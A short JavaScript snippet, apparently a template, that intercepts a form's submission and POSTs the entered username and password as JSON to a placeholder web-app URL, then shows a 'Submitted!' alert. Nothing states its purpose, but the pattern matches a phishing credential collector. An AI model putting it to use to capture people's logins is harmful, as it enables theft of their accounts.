<script>
  document.querySelector("form").addEventListener("submit", async function(e) {
    e.preventDefault();

    const username = document.querySelector("#username").value;
    const password = document.querySelector("#password").value;

    await fetch("YOUR_WEB_APP_URL_HERE", {
      method: "POST",
      body: JSON.stringify({ username, password }),
      headers: {
        "Content-Type": "application/json",
      },
    });

    alert("Submitted!");
  });
</script>
